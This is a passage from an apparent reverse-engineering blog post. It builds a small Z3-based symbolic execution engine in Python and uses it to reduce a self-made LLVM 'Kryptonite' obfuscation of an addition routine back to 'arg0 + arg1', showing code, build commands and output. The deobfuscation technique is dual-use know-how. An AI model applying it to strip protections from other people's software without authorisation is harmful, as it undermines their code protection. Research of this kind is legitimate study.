</span><span class='line'>                <span class="k">elif</span> <span class="n">dst</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;var_&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">if</span> <span class="n">dst</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">:</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;mov&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;shr&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># shr reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">LShR</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">),</span> <span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;shr&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;shl&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># shl reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;shl&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;and&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span> <span class="o">=</span> <span class="bp">None</span>
</span><span class='line'>                <span class="c"># and reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
</span><span class='line'>                    <span class="n">x</span> <span class="o">=</span> <span class="n">src</span>
</span><span class='line'>                <span class="c"># and reg32, reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;and&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;xor&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># xor reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">^</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;xor&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;or&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># or reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">|</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;or&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;add&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># add reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;add&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="n">mnemonic</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span>
</span><span class='line'>                <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This instruction is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_reg_equation_simplified</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
</span><span class='line'>        <span class="n">eq</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
</span><span class='line'>        <span class="n">eq</span> <span class="o">=</span> <span class="n">simplify</span><span class="p">(</span><span class="n">eq</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">eq</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Testing</h2>

<p>OK, we just have to instantiate the engine giving him the start/end address of the routine and to ask him to give us the final equation holded in EAX.</p>

<figure class='code'><figcaption><span>main</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Here we will try to attack the semantic-preserving obfuscations</span>
</span><span class='line'><span class="sd">    I talked about in &quot;Obfuscation of steel: meet my Kryptonite.&quot; : http://0vercl0k.tuxfamily.org/bl0g/?p=260.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The idea is to defeat those obfuscations using a tiny symbolic execution engine.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">sym</span> <span class="o">=</span> <span class="n">SymbolicExecutionEngine</span><span class="p">(</span><span class="mh">0x804845A</span><span class="p">,</span> <span class="mh">0x0804A17C</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Launching the engine..&#39;</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Done, retrieving the equation in EAX, and simplifying..&#39;</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">sym</span><span class="o">.</span><span class="n">get_reg_equation_simplified</span><span class="p">(</span><span class="s">&#39;eax&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;EAX=</span><span class="si">%r</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">eax</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And here is what I saw:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Launching the engine..
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg0
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg1
</span><span class='line'>Done, retrieving the equation in EAX, and simplifying..
</span><span class='line'>EAX=(~(Concat(2147483647, Extract(0, 0, arg1)) |
</span><span class='line'>   Concat(2147483647, ~Extract(0, 0, arg0)) |
</span><span class='line'>   4294967294) |
</span><span class='line'> ~(Concat(2147483647, ~Extract(0, 0, arg1)) |
</span><span class='line'>   Concat(2147483647, Extract(0, 0, arg0)) |
</span><span class='line'>   4294967294)) +
</span><span class='line'>Concat(~(Concat(1073741823, Extract(1, 1, arg1)) |
</span><span class='line'>         Concat(1073741823, ~Extract(1, 1, arg0)) |
</span><span class='line'>         Concat(1073741823,
</span><span class='line'>                ~(~Extract(0, 0, arg1) |
</span><span class='line'>                  ~Extract(0, 0, arg0)))) |
</span><span class='line'>       ~(Concat(1073741823, ~Extract(1, 1, arg1)) |
</span><span class='line'>         Concat(1073741823, Extract(1, 1, arg0)) |
</span><span class='line'>         Concat(1073741823,
</span><span class='line'>                ~(~Extract(0, 0, arg1) |
</span><span class='line'>                  ~Extract(0, 0, arg0)))) |
</span><span class='line'>       ~(Concat(1073741823, Extract(1, 1, arg1)) |
</span><span class='line'>         Concat(1073741823, Extract(1, 1, arg0)) |
</span><span class='line'>         Concat(1073741823, ~Extract(0, 0, arg1)) |
</span><span class='line'>         Concat(1073741823, ~Extract(0, 0, arg0)) |
</span><span class='line'>         2147483646) |
</span><span class='line'>       ~(Concat(1073741823, ~Extract(1, 1, arg1)) |
</span><span class='line'>         Concat(1073741823, ~Extract(1, 1, arg0)) |
</span><span class='line'>         Concat(1073741823, ~Extract(0, 0, arg1)) |
</span><span class='line'>         Concat(1073741823, ~Extract(0, 0, arg0)) |
</span><span class='line'>         2147483646),
</span><span class='line'>       0) +
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>There was two possible explanations for this problem:</p>

<ul>
<li>my code is wrong, and it generates equations not simplify-able.</li>
<li>my code is right, and Z3Py&rsquo;s simplify method has a hard time to simplify it.</li>
</ul>


<p> To know what was the right answer, I used Z3Py&rsquo;s prove function in order to know if the equation was equivalent to a simple addition:</p>

<figure class='code'><figcaption><span>main</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'> <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Here we will try to attack the semantic-preserving obfuscations</span>
</span><span class='line'><span class="sd">    I talked about in &quot;Obfuscation of steel: meet my Kryptonite.&quot; : http://0vercl0k.tuxfamily.org/bl0g/?p=260.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The idea is to defeat those obfuscations using a tiny symbolic execution engine.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">sym</span> <span class="o">=</span> <span class="n">SymbolicExecutionEngine</span><span class="p">(</span><span class="mh">0x804845A</span><span class="p">,</span> <span class="mh">0x0804A17C</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Launching the engine..&#39;</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Done, retrieving the equation in EAX, and simplifying..&#39;</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">sym</span><span class="o">.</span><span class="n">get_reg_equation_simplified</span><span class="p">(</span><span class="s">&#39;eax&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">prove</span><span class="p">(</span><span class="n">eax</span> <span class="o">==</span> <span class="n">Sum</span><span class="p">(</span><span class="n">sym</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Fortunately for us, it printed <em>True</em> ; so our code is correct. But it also means, the simplify function, as is at least, isn&rsquo;t able to simplify that bunch of equations involving bit-vector arithmetics. I still haven&rsquo;t found a clean way to make Z3Py simplify my big equation, so if someone knows how I can do that please contact me. I&rsquo;ve also exported the complete equation, and uploaded it <a href="http://doar-e.github.io/downloads/code/breaking_kryptonite_s_obfuscation_with_symbolic_execution/eq.txt">here</a> ; you are free to give it a try like this.</p>

<p>The ugly trick I came up with is just to use Z3Py&rsquo;s prove function, to try to prove that the equation is in fact an addition and if this is the case it returns the simplified equation. Again, if someone manages to simplify the previous equation without that type of trick I&rsquo;m really interested!</p>

<figure class='code'><figcaption><span>nasty trick</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">_simplify_additions</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">eq</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;The idea in this function is to help Z3 to simplify our big bitvec-arithmetic</span>
</span><span class='line'><span class="sd">    expression. It&#39;s simple, in eq we have a big expression with two symbolic variables (arg0 &amp; arg1)</span>
</span><span class='line'><span class="sd">    and a lot of bitvec arithmetic. Somehow, the simplify function is not clever enough to reduce the</span>
</span><span class='line'><span class="sd">    equation.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The idea here is to use the prove function in order to see if we can simplify an equation by an addition of the</span>
</span><span class='line'><span class="sd">    symbolic variables.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="c"># The two expressions are equivalent ; we got a simplification!</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">prove</span><span class="p">(</span><span class="n">Sum</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">)</span> <span class="o">==</span> <span class="n">eq</span><span class="p">):</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">Sum</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">eq</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">get_reg_equation_simplified</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
</span><span class='line'>    <span class="n">eq</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
</span><span class='line'>    <span class="n">eq</span> <span class="o">=</span> <span class="n">simplify</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_simplify_additions</span><span class="p">(</span><span class="n">eq</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">eq</span>
</span></code></pre></td></tr></table></div></figure>


<p>And now if you relaunch the script you will get:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Launching the engine..
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg0
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg1
</span><span class='line'>Done, retrieving the equation in EAX, and simplifying..
</span><span class='line'>EAX=arg0 + arg1
</span></code></pre></td></tr></table></div></figure>


<p>We just successfully simplified two thousands of assembly into a simple addition, wonderful!</p>

<h1>Symbolic execution VS Kryptonite</h1>

<p>OK, now we have a working engine able to break a small program (~two thousands instructions), let&rsquo;s see if we can do the same with a kryptonized-binary. Let&rsquo;s take a simple addition like in the previous parts:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Result: %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">add</span><span class="p">(</span><span class="n">atoll</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="n">atoll</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])));</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, time for a kryptonization:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>wget https://raw.github.com/0vercl0k/stuffz/master/llvm-funz/kryptonite/llvm-functionpass-kryptonite-obfuscater.cpp
</span><span class='line'><span class="nv">$ </span>clang++ llvm-functionpass-kryptonite-obfuscater.cpp <span class="sb">`</span>llvm-config --cxxflags --ldflags --libs core<span class="sb">`</span> -shared -o llvm-functionpass-kryptonite-obfuscater.so
</span><span class='line'><span class="nv">$ </span>clang -S -emit-llvm add.c -o add.ll
</span><span class='line'><span class="nv">$ </span>opt -S -load ~/dev/llvm-functionpass-kryptonite-obfuscater.so -kryptonite -heavy-add-obfu add.ll -o add.opti.ll <span class="o">&amp;&amp;</span> mv add.opti.ll add.ll
</span><span class='line'><span class="nv">$ </span>opt -S -load ~/dev/llvm-functionpass-kryptonite-obfuscater.so -kryptonite -heavy-add-obfu add.ll -o add.opti.ll <span class="o">&amp;&amp;</span> mv add.opti.ll add.ll
</span><span class='line'><span class="nv">$ </span>llc -O0 -filetype<span class="o">=</span>obj -march<span class="o">=</span>x86 add.ll -o add.o
</span><span class='line'><span class="nv">$ </span>clang -static add.o -o kryptonite-add
</span><span class='line'><span class="nv">$ </span>strip --strip-all ./kryptonite-add
</span></code></pre></td></tr></table></div></figure>


<p>At this moment we end up with that binary: <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/kryptonite-add">kryptonite-add</a>. The target routine for our study starts at 0x804823C and ends at 0x08072284 ; roughly more than 40 thousands assembly instructions and kind of big right?</p>

<p>Here is our final IDAPython script after some minor adjustments (added one or two more instructions):</p>

<figure class='code'><figcaption><span>tiny_symbolic_execution_engine_z3.py</span><a href='https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/tiny_symbolic_execution_engine_z3.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
